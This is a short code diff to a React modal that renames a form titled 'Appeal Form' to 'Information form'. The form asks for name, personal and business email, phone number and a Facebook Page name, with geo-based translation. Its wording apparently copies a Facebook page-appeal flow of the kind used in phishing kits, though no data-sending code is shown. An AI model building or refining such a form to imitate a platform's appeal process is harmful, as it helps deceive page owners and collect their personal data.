@@ -52,7 +52,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Information form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -135,7 +135,7 @@ ${
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
             <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                 <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
-                    <p className='text-2xl font-bold'>{t('Appeal Form')}</p>
+                    <p className='text-2xl font-bold'>{t('Information form')}</p>
                     <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='xl' />
                     </button>
